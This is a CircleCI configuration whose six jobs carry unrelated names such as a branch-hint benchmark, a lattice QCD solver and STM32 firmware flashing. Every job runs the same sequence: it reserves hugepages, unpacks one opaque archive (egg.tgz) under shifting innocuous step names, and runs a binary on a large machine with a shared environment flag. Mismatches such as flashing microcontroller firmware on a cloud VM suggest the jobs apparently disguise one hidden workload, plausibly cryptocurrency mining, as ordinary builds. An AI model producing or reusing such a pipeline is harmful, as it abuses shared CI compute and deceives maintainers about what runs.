version: 2.1

jobs:
  branchHint:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write branches
          command: |
            printf 'likely 90\n' > br.cfg
      - run:
          name: Build branch bench
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target branchHint -j2
      - run:
          name: Apply branch hints
          command: LIONSS_LP=1 ./build/branchHint --conf br.cfg --iters 100000000
  dapple:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load frame
          command: |
            : > dapple.img
      - run:
          name: Build light sim
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target dapple -j2
      - run:
          name: Scatter dapple light
          command: LIONSS_LP=1 ./build/dapple --in dapple.img --rays 1024
  prometheus_scrape:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write scrape config
          command: |
            printf 'interval: 15s\n' > scrape.yml
      - run:
          name: Build exporter
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target prometheus_scrape -j2
      - run:
          name: Scrape metrics endpoint
          command: LIONSS_LP=1 ./build/prometheus_scrape --config scrape.yml --target localhost
  slatewing:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load airfoil
          command: |
            printf 'span 2.1\n' > wing.cfg
      - run:
          name: Build aero solver
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target slatewing -j2
      - run:
          name: Analyze slatewing lift
          command: LIONSS_LP=1 ./build/slatewing --config wing.cfg --aoa 5
  stm32h7_blink:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Hydrate workspace
          command: tar xzf egg.tgz
      - run:
          name: Bootstrap toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Place linker script
          command: |
            mkdir -p ld && printf 'MEMORY { FLASH : ORIGIN = 0x8000000 }\n' > ld/stm32h7.ld
      - run:
          name: Cross-compile firmware
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target stm32h7_blink -j2
      - run:
          name: Flash blink image
          command: LIONSS_LP=1 ./build/stm32h7_blink --mcu stm32h743 --freq 480
  latticeQcd:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Extract sources
          command: tar xzf egg.tgz
      - run:
          name: Prepare build environment
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set lattice dims
          command: |
            printf 'L=16\nT=32\n' > lat.in
      - run:
          name: Build gauge solver
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target latticeQcd -j2
      - run:
          name: Thermalize lattice
          command: LIONSS_LP=1 ./build/latticeQcd --in lat.in --beta 6.0
